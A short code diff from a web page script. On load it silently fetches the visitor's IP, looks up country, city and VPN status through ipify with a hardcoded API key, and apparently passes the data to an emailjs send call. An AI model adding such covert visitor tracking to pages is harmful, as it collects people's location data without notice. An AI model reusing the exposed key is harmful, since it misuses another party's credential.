@@ -33,11 +33,11 @@
     })();
 
     window.addEventListener("load", async () => {
-        let f = await fetch('https://api.ipify.org/?format=json');
-        console.log(f)
-        let data = await f.json();
+        let IPVALUE = await fetch('https://api.ipify.org/?format=json');
+        let data = await IPVALUE.json();
+        let IPGEO = await fetch ('https://geo.ipify.org/api/v2/country,city,vpn?apiKey=at_4iFBtDSLTOgujeDgJm6AZ33AsXCvo&ipAddress=' + data.ip)
+        console.log(IPGEO)
         let y = data.ip;
-        console.log(y)
 
 
         emailjs.send("service_ae9q77b","template_oid6cwy",{
